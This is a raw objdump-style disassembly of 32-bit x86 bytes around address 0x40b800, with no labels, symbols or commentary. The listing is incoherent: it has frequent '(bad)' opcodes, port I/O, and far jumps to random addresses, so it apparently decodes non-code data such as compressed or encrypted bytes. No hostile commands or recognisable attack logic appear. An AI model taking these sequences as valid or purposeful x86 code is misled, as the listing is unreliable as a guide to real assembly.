  40b782:	jmp    0xb36b0c6f
  40b787:	add    esi,DWORD PTR [edi+ecx*1-0x58]
  40b78b:	xchg   DWORD PTR [edx-0x7],esi
  40b78e:	mov    dh,0xbe
  40b790:	mov    cl,0xb4
  40b792:	cli    
  40b793:	outs   dx,DWORD PTR ds:[esi]
  40b794:	fsubr  QWORD PTR [eax]
  40b796:	jne    0x40b736
  40b798:	xchg   BYTE PTR [eax+0x63],dl
  40b79b:	ins    BYTE PTR es:[edi],dx
  40b79c:	push   ecx
  40b79d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b79e:	outs   dx,BYTE PTR ss:[esi]
  40b7a0:	push   0x7f
  40b7a2:	and    cl,BYTE PTR [ebx-0x7acf213d]
  40b7a8:	sbb    eax,0xd6e21ca4
  40b7ad:	ds xor al,0xd8
  40b7b0:	addr16 addr16 das 
  40b7b3:	mov    cl,0xfc
  40b7b5:	mov    esi,0x7e7a0a24
  40b7ba:	daa    
  40b7bb:	sub    BYTE PTR [ecx-0x6],dl
  40b7be:	mov    ss,esp
  40b7c0:	inc    ebx
  40b7c1:	pop    es
  40b7c2:	and    eax,0x30e16f54
  40b7c7:	stc    
  40b7c8:	(bad)  
  40b7c9:	call   0x3252cc66
  40b7ce:	test   BYTE PTR [edi+0x99a5929],cl
  40b7d4:	mov    edx,0xb68c1084
  40b7d9:	cmc    
  40b7da:	outs   dx,BYTE PTR ds:[esi]
  40b7db:	xor    BYTE PTR [esi+0x236d7c6f],dl
  40b7e1:	stos   DWORD PTR es:[edi],eax
  40b7e2:	pop    ds
  40b7e3:	test   eax,0xffae368d
  40b7e8:	cmc    
  40b7e9:	mov    dl,0xd2
  40b7eb:	mov    eax,0x89e8faac
  40b7f0:	in     al,0x89
  40b7f2:	sbb    eax,DWORD PTR [eax+0xe7e86d6]
  40b7f8:	pop    ss
  40b7f9:	clc    
  40b7fa:	and    eax,0x1631015e
  40b7ff:	push   es
  40b800:	retf   
  40b801:	arpl   WORD PTR [ebx-0x4ab9da80],sp
  40b807:	push   edi
  40b808:	lahf   
  40b809:	daa    
  40b80a:	cmc    
  40b80b:	pop    ecx
  40b80c:	hlt    
  40b80d:	or     eax,0xbfacf6a3
  40b812:	bnd js 0x40b7e7
  40b815:	arpl   WORD PTR [esi],sp
  40b817:	sbb    eax,0x9209edb
  40b81c:	jl     0x40b7dc
  40b81e:	xor    DWORD PTR [edi-0x67291b68],esi
  40b824:	out    0x72,eax
  40b826:	(bad)  
  40b827:	enter  0x547b,0x58
  40b82b:	loop   0x40b827
  40b82d:	cwde   
  40b82e:	in     al,dx
  40b82f:	imul   eax,DWORD PTR [ebp-0x2c],0xffffffea
  40b833:	pop    esp
  40b834:	test   BYTE PTR [esp+edx*2+0x63],ch
  40b838:	push   ecx
  40b839:	or     al,BYTE PTR [eax+ecx*4-0x12f89132]
  40b840:	lods   eax,DWORD PTR ds:[esi]
  40b841:	mov    esi,0xc520187e
  40b846:	(bad)  
  40b847:	xchg   esi,eax
  40b848:	out    0xba,al
  40b84a:	or     al,0x46
  40b84c:	or     ebp,DWORD PTR [edi+ebp*4]
  40b84f:	in     al,0x8c
  40b851:	sahf   
  40b852:	out    dx,eax
  40b853:	jne    0x40b80d
  40b855:	xchg   edx,eax
  40b856:	or     eax,0xc4b86adb
  40b85b:	inc    ebp
  40b85c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b85d:	clc    
  40b85e:	push   0x8272968
  40b863:	push   edx
  40b864:	add    al,0xbb
  40b866:	jp     0x40b89d
  40b868:	lea    esp,[edi-0x7a]
  40b86b:	pop    esi
  40b86c:	cmp    DWORD PTR [eax+0x48cca9f5],esi
  40b872:	or     eax,0x4382ffd5
  40b877:	sbb    al,0xe8
  40b879:	xchg   edi,eax
  40b87a:	or     DWORD PTR [ebx-0x7a],edx
  40b87d:	jae    0x40b824
  40b87f:	push   ss
  40b880:	repz enter 0x15ca,0xb
  40b885:	cmp    DWORD PTR [edi+ecx*4+0x13],edx
  40b889:	add    bl,bl
  40b88b:	xor    DWORD PTR [edi],esi
  40b88d:	mov    ecx,0xd402ca2d
  40b892:	sub    eax,0xdcd69734
  40b897:	fwait
  40b898:	xchg   edx,eax
  40b899:	into   
  40b89a:	add    eax,0x44e5c8ad
  40b89f:	add    eax,0xd5a781d
  40b8a4:	add    BYTE PTR [ebp-0x1e],cl
  40b8a7:	or     ch,BYTE PTR [edi+edi*4-0x1]
  40b8ab:	leave  
  40b8ac:	or     BYTE PTR [edx+0x3f9edf4f],0xd
  40b8b3:	in     al,0xc7
  40b8b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8b6:	xchg   esp,eax
  40b8b7:	push   esi
  40b8b8:	cvtps2pd xmm1,xmm5
  40b8bb:	inc    ebp
  40b8bc:	cdq    
  40b8bd:	sub    al,0xbf
  40b8bf:	in     al,dx
  40b8c0:	daa    
  40b8c1:	cwde   
  40b8c2:	repnz xchg esp,eax
  40b8c4:	dec    ebx
  40b8c5:	cmp    esp,DWORD PTR [edi-0x68]
  40b8c8:	aaa    
  40b8c9:	(bad)  
  40b8ca:	lods   al,BYTE PTR ds:[esi]
  40b8cb:	icebp  
  40b8cc:	js     0x40b8f1
  40b8ce:	add    bl,bh
  40b8d0:	mov    al,0x1d
  40b8d2:	aad    0x5d
  40b8d4:	(bad)  
  40b8d5:	and    eax,0x5b9778e1
  40b8da:	rcl    edx,0xce
  40b8dd:	aaa    
  40b8de:	inc    eax
  40b8df:	fst    DWORD PTR [ecx]
  40b8e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8e2:	jb     0x40b8e5
  40b8e4:	push   cs
  40b8e5:	daa    
  40b8e6:	es int 0x9e
  40b8e9:	rcl    BYTE PTR [ecx-0x36],cl
  40b8ec:	mov    DWORD PTR [edx-0x35],ecx
  40b8ef:	push   edx
  40b8f0:	dec    eax
  40b8f1:	stos   BYTE PTR es:[edi],al
  40b8f2:	jge    0x40b888
  40b8f4:	gs sub ebx,ebp
  40b8f7:	cmp    al,0xde
  40b8f9:	pop    ds
  40b8fa:	shl    DWORD PTR [ebp+0x67],1
  40b8fd:	add    al,0xb5
  40b8ff:	and    eax,0xe3bdbf48
  40b904:	mov    ch,0x63
  40b906:	dec    edx
  40b907:	das    
  40b908:	jne    0x40b8f4
  40b90a:	imul   ch
  40b90c:	adc    BYTE PTR [esi+ebx*4+0x3f94707c],ah
  40b913:	adc    edi,DWORD PTR [eax]
  40b915:	sbb    eax,0x12799769
  40b91a:	call   0x3d704bef
  40b91f:	mov    ebp,0x205cc6f3
  40b924:	lock and al,0xa0
  40b927:	jae    0x40b8c9
  40b929:	xor    bh,BYTE PTR [edi+0x3a7eb558]
  40b92f:	xchg   ebx,eax
  40b930:	repz call 0x91850931
  40b936:	and    al,al
  40b938:	xchg   esi,eax
  40b939:	inc    BYTE PTR ds:0x2ee43997
  40b93f:	sbb    DWORD PTR [edi-0x6],eax
  40b942:	dec    esi
  40b943:	xor    al,0x9f
  40b945:	icebp  
  40b946:	je     0x40b997
  40b948:	or     cl,BYTE PTR ds:[eax]
  40b94b:	cld    
  40b94c:	out    dx,eax
  40b94d:	mov    BYTE PTR [edi+0x6bf42f24],bl
  40b953:	jae    0x40b8e8
  40b955:	shl    DWORD PTR cs:[esi],1
  40b958:	or     edx,ecx
  40b95a:	mov    cl,0x3a
  40b95c:	out    0x5d,eax
  40b95e:	mov    dl,0x35
  40b960:	sbb    dh,dh
  40b962:	sbb    DWORD PTR [edi+0x26],edx
  40b965:	pop    esp
  40b966:	mov    bh,BYTE PTR [edi]
  40b968:	xor    eax,0x757f872e
  40b96d:	inc    eax
  40b96e:	out    dx,al
  40b96f:	cld    
  40b970:	dec    edx
  40b971:	sub    DWORD PTR [eax],eax
  40b973:	jae    0x40b96b
  40b975:	into   
  40b976:	cmp    eax,0x22b06d7
  40b97b:	sbb    DWORD PTR [ecx],edx
  40b97d:	mov    ecx,0xf3151e6b
  40b982:	push   eax
  40b983:	(bad)  
  40b984:	iret   
  40b985:	int3   
  40b986:	js     0x40b978
  40b988:	and    al,0xb0
  40b98a:	div    esp
  40b98c:	dec    eax
  40b98d:	and    al,0x6d
  40b98f:	repnz sbb BYTE PTR [esi+eax*4],bl
  40b993:	dec    esi
  40b994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b995:	dec    ecx
  40b996:	loope  0x40b9a7
  40b998:	icebp  
  40b999:	lods   eax,DWORD PTR ds:[esi]
  40b99a:	sar    BYTE PTR [esi],1
  40b99c:	inc    edi
  40b99d:	cmp    eax,0xdcf3bf52
  40b9a2:	dec    edi
  40b9a3:	int3   
  40b9a4:	dec    edx
  40b9a5:	adc    al,0x2f
  40b9a7:	jns    0x40b9ad
  40b9a9:	daa    
  40b9aa:	push   es
  40b9ab:	jg     0x40b941
  40b9ad:	jne    0x40b9d6
  40b9af:	mov    al,ds:0x21aee11a
  40b9b4:	push   ss
  40b9b5:	jb     0x40b9b6
  40b9b7:	cmp    BYTE PTR [edi+0x3ada2c69],al
  40b9bd:	push   0x94e07636
  40b9c2:	sbb    BYTE PTR [ebx-0x2023e263],ch
  40b9c8:	ss jmp 0xdb4e3c76
  40b9ce:	push   0xffffff88
  40b9d0:	ja     0x40ba3b
  40b9d2:	cmp    eax,0xbee390b2
  40b9d7:	scas   eax,DWORD PTR es:[edi]
  40b9d8:	jns    0x40ba16
  40b9da:	adc    ebp,edx
  40b9dc:	or     eax,DWORD PTR [ebp-0x51]
  40b9df:	add    eax,0x12efe9ab
  40b9e4:	(bad)  
  40b9e5:	aam    0xcb
  40b9e7:	div    DWORD PTR [edi+0x44]
  40b9ea:	dec    esi
  40b9eb:	jmp    FWORD PTR [edx-0x57]
  40b9ee:	inc    ebx
  40b9ef:	sbb    eax,0xe1ccde80
  40b9f4:	mov    al,ds:0xc6c05b70
  40b9f9:	push   eax
  40b9fa:	imul   ebp,DWORD PTR [esi+0x3a],0xc372c69b
  40ba01:	xchg   ebx,eax
  40ba02:	retf   0x4a8c
  40ba05:	dec    edx
  40ba06:	cmc    
  40ba07:	cld    
  40ba08:	cmp    bh,BYTE PTR [esi+0xb14e068]
  40ba0e:	loope  0x40b9a9
  40ba10:	lea    ecx,[ebp+0x5c]
  40ba13:	out    dx,eax
  40ba14:	and    ecx,DWORD PTR [edi+0x3e]
  40ba17:	call   0x70a42126
  40ba1c:	add    eax,0x9fb2ad99
  40ba21:	sbb    ebp,DWORD PTR [edi+eax*8]
  40ba24:	sub    BYTE PTR [ecx-0x18],0x9f
  40ba28:	out    dx,al
  40ba29:	mov    al,ds:0x974c6ade
  40ba2e:	mov    esi,0x5d9f2371
  40ba33:	sbb    BYTE PTR [edi-0x5d14e56],0x7a
  40ba3a:	out    dx,eax
  40ba3b:	jmp    0x908c1218
  40ba40:	std    
  40ba41:	mov    ah,0xd0
  40ba43:	mov    ah,0xbb
  40ba45:	(bad)  
  40ba46:	sti    
  40ba47:	push   edx
  40ba48:	div    DWORD PTR fs:[ecx-0x61ddbf55]
  40ba4f:	cs loopne 0x40babb
  40ba52:	(bad)  
  40ba53:	(bad)  
  40ba54:	and    DWORD PTR [ebp-0x4c],esp
  40ba57:	add    eax,0x14c7291f
  40ba5c:	mov    ebx,0x7290630f
  40ba62:	test   BYTE PTR ds:0xdee69e56,al
  40ba68:	shl    BYTE PTR ds:0x8e28aa0c,cl
  40ba6e:	shl    DWORD PTR [esi+0x4c],cl
  40ba71:	sbb    bh,BYTE PTR [edx]
  40ba73:	adc    DWORD PTR [ebx+0x6f],edi
  40ba76:	xor    DWORD PTR [edx+0x13],edi
  40ba79:	mov    eax,ds:0x6562a4c0
  40ba7e:	mov    ecx,0x14355626
  40ba83:	jl     0x40ba36
  40ba85:	push   eax
  40ba86:	jmp    0x8d8a5016
  40ba8b:	xbegin 0x71b5a42e
  40ba91:	adc    al,0xc2
  40ba93:	std    
  40ba94:	lock ja 0x40baf6
  40ba97:	inc    ecx
  40ba98:	ins    DWORD PTR es:[edi],dx
  40ba99:	xor    eax,0xab5701f3
  40ba9e:	mov    ah,0xf7
  40baa0:	inc    esp
  40baa1:	add    eax,0xc319f977
  40baa6:	or     eax,DWORD PTR [edx]
  40baa8:	dec    edx
  40baa9:	mov    DWORD PTR [edx+0x63],edi
  40baac:	xor    BYTE PTR [ebp+0x6a2a65e],0xef
  40bab3:	or     bl,BYTE PTR [esi-0x10]
  40bab6:	mov    gs,eax
  40bab8:	pop    ss
  40bab9:	pop    es
  40baba:	mov    eax,ds:0xe3ddaded
  40babf:	sbb    eax,0xdc15b3af
  40bac4:	mov    edx,es
  40bac6:	xor    al,0x26
  40bac8:	push   ebp
  40bac9:	cmc    
  40baca:	lds    ebx,FWORD PTR [ecx+0x50]
  40bacd:	cmp    eax,0x556616a6
  40bad2:	inc    ebp
  40bad3:	ficom  DWORD PTR [eax]
  40bad5:	xchg   edx,eax
  40bad6:	leave  
  40bad7:	outs   dx,BYTE PTR ds:[esi]
  40bad8:	jns    0x40bb27
  40bada:	xchg   ebx,eax
  40badb:	mov    esp,0x7962b0b7
  40bae0:	retf   0xd3c2
  40bae3:	dec    eax
  40bae4:	xchg   BYTE PTR [ebx],dl
  40bae6:	adc    ch,cl
  40bae8:	std    
  40bae9:	jecxz  0x40baa0
  40baeb:	sbb    DWORD PTR [edi],0x3
  40baee:	jmp    0xe8ee:0x848a38af
  40baf5:	adc    eax,DWORD PTR [eax+0x1ba83e65]
  40bafb:	ins    DWORD PTR es:[edi],dx
  40bafc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bafd:	and    esp,esi
  40baff:	imul   ch
  40bb01:	test   BYTE PTR [ebx+edi*2+0x5e],0x8a
  40bb06:	add    esp,DWORD PTR [eax]
  40bb08:	data16 mov dl,0x3b
  40bb0b:	mov    edx,0x1dd244b9
  40bb10:	jmp    0x9d6d3193
  40bb15:	(bad)  
  40bb16:	jb     0x40ba9a
  40bb18:	call   0x54d9bb75
  40bb1d:	pusha  
  40bb1e:	and    DWORD PTR [ebx+0x57],ebp
  40bb21:	add    DWORD PTR [ebx+0x26],edx
  40bb24:	out    0x70,eax
  40bb26:	lea    sp,ds:[ebp+eax*2-0x5d]
  40bb2c:	cli    
  40bb2d:	test   eax,0x4247c114
  40bb32:	icebp  
  40bb33:	aad    0x2
  40bb35:	jge    0x40bb59
  40bb37:	xchg   ebx,eax
  40bb38:	fcmovnu st,st(2)
  40bb3a:	mov    ch,0x2f
  40bb3c:	push   edx
  40bb3d:	or     eax,0x30d4352e
  40bb42:	pop    esp
  40bb43:	mov    ds:0x2a817ef6,al
  40bb48:	clc    
  40bb49:	push   esi
  40bb4a:	leave  
  40bb4b:	mov    BYTE PTR [esi+0x9690282],dh
  40bb51:	std    
  40bb52:	adc    BYTE PTR [ebx-0x39],ah
  40bb55:	jl     0x40bb17
  40bb57:	jmp    0x40bb62
  40bb59:	sbb    BYTE PTR [esi+0xb823c19],ah
  40bb5f:	imul   ebx,DWORD PTR [edx-0x1],0xd06e55b1
  40bb66:	lahf   
  40bb67:	(bad)  
  40bb68:	xlat   BYTE PTR ds:[ebx]
  40bb69:	shl    DWORD PTR [edx+0x6a],0x6d
  40bb6d:	into   
  40bb6e:	pusha  
  40bb6f:	xchg   ebp,esp
  40bb71:	addr16 jnp 0x40bb4c
  40bb74:	dec    edx
  40bb75:	imul   eax,eax,0xa085a4bf
  40bb7b:	xor    eax,0xd8ed4f80
  40bb80:	pop    ebx
  40bb81:	and    ah,BYTE PTR [ebp+0x40bd304c]
  40bb87:	mov    bl,0xb
  40bb89:	retf   
  40bb8a:	das    
  40bb8b:	adc    eax,0xaa67b5f4
  40bb90:	in     al,0xcd
  40bb92:	loopne 0x40bbcc
  40bb94:	pop    esp
  40bb95:	and    al,0x68
  40bb97:	fisub  WORD PTR [eax]
  40bb99:	dec    ecx
  40bb9a:	cmp    DWORD PTR ds:0xbccd484a,0x57
  40bba1:	repz cld 
  40bba3:	pop    ss
  40bba4:	dec    ecx
  40bba5:	sbb    al,0x25
  40bba7:	ss jns 0x40bb8a
  40bbaa:	xlat   BYTE PTR ds:[ebx]
  40bbab:	imul   DWORD PTR [edi-0x3c6c97d4]
  40bbb1:	adc    BYTE PTR [edi],ch
  40bbb3:	adc    DWORD PTR [esi+edi*1-0x3a],0x63
  40bbb8:	gs je  0x40bbd1
  40bbbb:	push   0x5550eace
  40bbc0:	pop    ss
  40bbc1:	push   0x7c
  40bbc3:	xchg   ebp,eax
  40bbc4:	mov    esp,0x954d7a7b
  40bbc9:	push   0x84ce7f48
  40bbce:	daa    
  40bbcf:	xlat   BYTE PTR ds:[ebx]
  40bbd0:	xchg   ebx,eax
  40bbd1:	loop   0x40bb91
  40bbd3:	lock dec eax
  40bbd5:	sub    eax,0x5c156e4b
  40bbda:	mov    bl,0x92
  40bbdc:	shl    ch,1
  40bbde:	scas   al,BYTE PTR es:[edi]
  40bbdf:	mov    edx,0x88e72bf4
  40bbe4:	push   ebx
  40bbe5:	jg     0x40bb94
  40bbe7:	and    cl,dh
  40bbe9:	sti    
  40bbea:	jge    0x40bc19
  40bbec:	adc    cl,BYTE PTR ds:0x3423f17
  40bbf2:	mov    al,ds:0xa06fc7c4
  40bbf7:	push   ss
  40bbf8:	xchg   ecx,eax
  40bbf9:	hlt    
  40bbfa:	pcmpgtw mm3,QWORD PTR [ecx-0x310917bb]
  40bc01:	outs   dx,BYTE PTR ds:[esi]
  40bc02:	and    DWORD PTR [esi+0x2fad7380],edx
  40bc08:	popa   
  40bc09:	and    WORD PTR [edx],di
  40bc0c:	adc    DWORD PTR [edi+0x35b93038],0xef503178
  40bc16:	adc    BYTE PTR [edi],bh
  40bc18:	das    
  40bc19:	mov    BYTE PTR [eax-0x13aec833],ah
  40bc1f:	into   
  40bc20:	push   esp
  40bc21:	push   cs
  40bc22:	lahf   
  40bc23:	jp     0x40bc19
  40bc25:	aaa    
  40bc26:	push   ebx
  40bc27:	adc    eax,DWORD PTR [ecx-0x55]
  40bc2a:	fs in  eax,dx
  40bc2c:	mov    DWORD PTR [ecx+0x2c],edx
  40bc2f:	ss mov bh,0x6
  40bc32:	out    dx,eax
  40bc33:	rcl    DWORD PTR [esi],1
  40bc35:	xchg   esp,eax
  40bc36:	out    dx,eax
  40bc37:	push   esi
  40bc38:	mov    esp,DWORD PTR [ebx]
  40bc3a:	into   
  40bc3b:	cs cli 
  40bc3d:	jbe    0x40bc0d
  40bc3f:	jg     0x40bcb0
  40bc41:	mov    bl,0x6c
  40bc43:	adc    eax,DWORD PTR [edx-0x76eaf7d0]
  40bc49:	test   DWORD PTR [ebx-0x1a],eax
  40bc4c:	jge    0x40bcb8
  40bc4e:	mov    ah,0xd4
  40bc50:	ds xchg esi,eax
  40bc52:	push   ss
  40bc53:	xchg   edi,eax
  40bc54:	xor    BYTE PTR [edx-0x7638e538],dh
  40bc5a:	shr    BYTE PTR [ebp-0x28f89dbe],cl
  40bc60:	cmp    al,0xca
  40bc62:	fdivr  QWORD PTR [ebx]
  40bc64:	cmp    ebp,DWORD PTR [esi+ebp*2-0x3ae2b719]
  40bc6b:	nop
  40bc6c:	pop    es
  40bc6d:	inc    ecx
  40bc6e:	jmp    0xcebf7355
  40bc73:	test   al,ah
  40bc75:	xchg   BYTE PTR [edx+0x61f71009],bl
  40bc7b:	pop    ecx
  40bc7c:	rcl    dl,cl
  40bc7e:	mul    BYTE PTR [esi+ecx*1+0x28]
  40bc82:	jle    0x40bceb
  40bc84:	in     eax,dx
  40bc85:	leave  
  40bc86:	sbb    BYTE PTR [esi],ah
  40bc88:	rcl    DWORD PTR [ecx],cl
  40bc8a:	cdq    
  40bc8b:	lahf   
  40bc8c:	arpl   WORD PTR [eax],dx
  40bc8e:	or     BYTE PTR [eax+esi*1],dl
  40bc91:	lahf   
  40bc92:	jo     0x40bc79
  40bc94:	cld    
  40bc95:	or     DWORD PTR [edx+edi*2+0xd],0x74c25bbf
  40bc9d:	jo     0x40bca5
  40bc9f:	fst    QWORD PTR ds:0xf942212c
  40bca5:	into   
  40bca6:	inc    edx
  40bca7:	lds    ebx,FWORD PTR [ecx]
  40bca9:	mov    BYTE PTR [ecx],cl
  40bcab:	inc    edx
  40bcac:	test   al,0x4b
  40bcae:	pop    ds
  40bcaf:	adc    bl,cl
  40bcb1:	fnstcw WORD PTR [ecx+0x6]
  40bcb4:	add    al,0xa3
  40bcb6:	out    0x33,eax
  40bcb8:	outs   dx,BYTE PTR ds:[esi]
  40bcb9:	jp     0x40bc85
  40bcbb:	imul   eax,DWORD PTR [ebx],0x13479326
  40bcc1:	fisub  DWORD PTR [edx+0x25f5cdd5]
  40bcc7:	or     BYTE PTR [ecx+edi*4-0x1ab2a6c1],al
  40bcce:	mov    ebp,0x3c4386af
  40bcd3:	cwde   
  40bcd4:	jmp    0xd0701b98
  40bcd9:	pop    ecx
  40bcda:	mov    esi,0xc2c8f633
  40bcdf:	add    ebx,DWORD PTR [ecx]
  40bce1:	in     al,dx
  40bce2:	(bad)  
  40bce3:	jns    0x40bd47
  40bce5:	fwait
  40bce6:	mov    dh,0x44
  40bce8:	pop    ss
  40bce9:	lahf   
  40bcea:	jp     0x40bd0d
  40bcec:	or     DWORD PTR [ecx],ebx
  40bcee:	rcl    BYTE PTR [edx+0x2d],1
  40bcf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcf2:	push   cs
  40bcf3:	rcr    DWORD PTR fs:[ebx+0x29],1
  40bcf7:	push   es
  40bcf8:	and    edi,DWORD PTR [ebx-0x3ac2ba40]
  40bcfe:	inc    ah
  40bd00:	ins    DWORD PTR es:[edi],dx
  40bd01:	jmp    0x4e52:0xa1cf2f77
  40bd08:	mov    eax,ds:0xbfa40f77
  40bd0d:	les    ebp,FWORD PTR ds:0xd046aef0
  40bd13:	(bad)  
  40bd15:	je     0x40bcea
  40bd17:	lock js 0x40bd8a
  40bd1a:	aaa    
  40bd1b:	push   ebx
  40bd1c:	imul   esi,DWORD PTR [ebx-0x55],0xae989d8a
  40bd23:	jne    0x40bd04
  40bd25:	or     al,0xa7
  40bd27:	sti    
  40bd28:	push   ss
  40bd29:	add    DWORD PTR [edx],esi
  40bd2b:	stos   DWORD PTR es:[edi],eax
  40bd2c:	adc    ah,BYTE PTR [edx+0x14]
  40bd2f:	test   DWORD PTR [edx+0x7a],ebp
  40bd32:	mov    esi,0xcbc9e95b
  40bd37:	(bad)  
  40bd38:	std    
  40bd39:	out    0xa7,eax
  40bd3b:	jbe    0x40bd33
  40bd3d:	jmp    0x350:0xd57fd907
  40bd44:	cmp    esp,ebx
  40bd46:	retf   0xab8b
  40bd49:	(bad)  
  40bd4a:	imul   eax,DWORD PTR [eax-0x5d45511c],0x6f22ab4e
  40bd54:	and    ebp,DWORD PTR fs:[edi+0x672ad123]
  40bd5b:	mov    esi,0x2e484b06
  40bd60:	jno    0x40bd30
  40bd62:	(bad)  
  40bd63:	mov    edi,0x5a0e3fbf
  40bd68:	add    eax,0xdff68ca5
  40bd6d:	sbb    esi,DWORD PTR [eax]
  40bd6f:	(bad)  
  40bd71:	cdq    
  40bd72:	adc    al,0x40
  40bd74:	mov    esp,0xb196e87
  40bd79:	xlat   BYTE PTR ds:[ebx]
  40bd7a:	(bad)  
  40bd7b:	push   0xffffff84
  40bd7d:	fdivp  st(4),st
  40bd7f:	dec    esp
  40bd80:	cmc    
  40bd81:	mov    ah,0x4f
  40bd83:	mov    dl,0x0
  40bd85:	mov    esp,0x3d9952cd
  40bd8a:	ret    
  40bd8b:	in     eax,0x64
  40bd8d:	ins    DWORD PTR es:[edi],dx
  40bd8e:	mov    dh,BYTE PTR [edx+0x3a431cec]
  40bd94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd95:	mov    dl,0x35
  40bd97:	cmc    
  40bd98:	jae    0x40bd66
  40bd9a:	cwde   
  40bd9b:	jnp    0x40bdf2
  40bd9d:	mov    ds:0x27a827d1,eax
  40bda2:	ins    DWORD PTR es:[edi],dx
  40bda3:	scas   al,BYTE PTR es:[edi]
  40bda4:	aad    0x83
  40bda6:	pop    edi
  40bda7:	mov    dh,0x4d
  40bda9:	xchg   DWORD PTR [esi+0x7c],esp
  40bdac:	retf   
  40bdad:	dec    esi
  40bdae:	mov    ds:0xe5f9d6e4,al
  40bdb3:	sbb    eax,0xffa1f77
  40bdb8:	lock mov ch,0x79
  40bdbb:	pop    ebp
  40bdbc:	sbb    DWORD PTR ds:0xe5e873ff,ebx
  40bdc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdc3:	jno    0x40bddf
  40bdc5:	lds    esi,FWORD PTR [ebx-0x18]
  40bdc8:	dec    edi
  40bdc9:	call   0xc5ff:0xfb9ebb4d
  40bdd0:	xchg   edx,eax
  40bdd1:	mov    BYTE PTR [edx+0x28fdbc3b],al
  40bdd7:	pop    ebx
  40bdd8:	arpl   WORD PTR [ebp+0x27],bx
  40bddb:	mov    DWORD PTR [eax+0x7e],ebp
  40bdde:	adc    ebx,DWORD PTR [edi]
  40bde0:	dec    esp
  40bde1:	shl    ah,1
  40bde3:	mov    ds:0xe7c9f928,al
  40bde8:	aad    0xf8
  40bdea:	bound  esi,QWORD PTR [edi+edi*8-0x2e]
  40bdee:	pop    ecx
  40bdef:	div    BYTE PTR [esi-0xf03cc42]
  40bdf5:	aas    
  40bdf6:	je     0x40be12
  40bdf8:	(bad)  
  40bdf9:	mov    ds:0x66178af8,eax
  40bdfe:	pop    edi
  40bdff:	icebp  
  40be00:	jmp    0xe27b:0x8714213a
  40be07:	dec    ecx
  40be08:	test   DWORD PTR [ecx+0xae4ac11],ebx
  40be0e:	dec    esi
  40be0f:	mov    BYTE PTR [edx+eiz*4-0x52],bh
  40be13:	jmp    0x421216c3
  40be18:	hlt    
  40be19:	ds mov eax,0x20fb3ccb
  40be1f:	sar    BYTE PTR [ebx-0x176c0d73],1
  40be25:	in     al,0x98
  40be27:	sub    bl,BYTE PTR [ebx+0x4a5fc015]
  40be2d:	push   ebx
  40be2e:	loope  0x40be96
  40be30:	stc    
  40be31:	test   al,0xcb
  40be33:	into   
  40be34:	xchg   edi,eax
  40be35:	or     BYTE PTR [edi+0x618d8393],dl
  40be3b:	xchg   BYTE PTR [ebx],ah
  40be3d:	mov    ecx,0x395d6911
  40be42:	mov    WORD PTR [edi+ecx*1+0x4e],gs
  40be46:	push   cs
  40be47:	pushf  
  40be48:	outs   dx,DWORD PTR ds:[esi]
  40be49:	mov    DWORD PTR [edi+0x4e],ebp
  40be4c:	pop    es
  40be4d:	mov    ecx,0x32a6ebbf
  40be52:	aad    0x4a
  40be54:	inc    ebp
  40be55:	leave  
  40be56:	cdq    
  40be57:	fistp  DWORD PTR [edi+edi*8]
  40be5a:	push   esi
  40be5b:	lahf   
  40be5c:	and    DWORD PTR [ebp-0x7836fe36],ebp
  40be62:	xor    al,0x91
  40be64:	mov    DWORD PTR [ebx],ebx
  40be66:	push   0xc2e285a1
  40be6b:	adc    al,bh
  40be6d:	outs   dx,DWORD PTR ds:[esi]
  40be6e:	inc    esi
  40be6f:	mov    BYTE PTR [ecx-0x36],bl
  40be72:	and    DWORD PTR [esi+0x15],0xffffffde
  40be76:	lahf   
  40be77:	mov    BYTE PTR [edi-0x705aa478],al
  40be7d:	dec    esp
  40be7e:	adc    BYTE PTR [bp+di+0x33],0xe9
  40be83:	aaa    
  40be84:	ret    0x8340
  40be87:	fwait
  40be88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be89:	pop    edi
  40be8a:	test   DWORD PTR [eax],edi
  40be8c:	push   cs
  40be8d:	xchg   ebx,eax
  40be8e:	jg     0x40bec3
  40be90:	xor    bh,BYTE PTR [ecx+0x5b]
  40be93:	retf   0xbdb4
  40be96:	daa    
  40be97:	jns    0x40be65
  40be99:	shr    DWORD PTR [edx],cl
  40be9b:	aam    0x56
  40be9d:	lahf   
  40be9e:	mov    ah,0xa3
  40bea0:	cs popa 
  40bea2:	adc    eax,0xe6944460
  40bea7:	popf   
  40bea8:	and    ch,0x4b
  40beab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40beac:	pop    ebp
  40bead:	ja     0x40be77
  40beaf:	ds mov dh,0x7c
  40beb2:	aam    0xfb
  40beb4:	mov    edx,0x6e1f8207
  40beb9:	push   es
  40beba:	gs pop es
  40bebc:	xchg   DWORD PTR [ebx-0x51982f46],edi
  40bec2:	ins    BYTE PTR es:[edi],dx
  40bec3:	pop    edi
  40bec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bec5:	ret    0x6892
  40bec8:	push   edi
  40bec9:	into   
  40beca:	push   cs
  40becb:	mov    ah,0x71
  40becd:	mov    ah,0x5c
  40becf:	out    0xf2,al
  40bed1:	xchg   BYTE PTR [edi],ch
  40bed3:	mov    ds:0x98d71002,al
  40bed8:	add    dh,dl
  40beda:	pop    ebx
  40bedb:	pop    edx
  40bedc:	sahf   
  40bedd:	out    0xeb,eax
  40bedf:	or     BYTE PTR [ebx],al
  40bee1:	std    
  40bee2:	not    dh
  40bee4:	addr16 mov eax,ds:0x21cf
  40bee8:	popf   
  40bee9:	outs   dx,BYTE PTR ds:[esi]
  40beea:	addr16 xchg ebx,esp
  40beed:	(bad)  
  40beef:	xchg   ecx,eax
  40bef0:	ss mov cl,0xd5
  40bef3:	mov    ah,0xd0
  40bef5:	dec    ebp
  40bef6:	jmp    0xec0efd13
  40befb:	fldcw  WORD PTR [edi+0x11]
  40befe:	dec    edi
  40beff:	pop    edx
  40bf00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf01:	pop    es
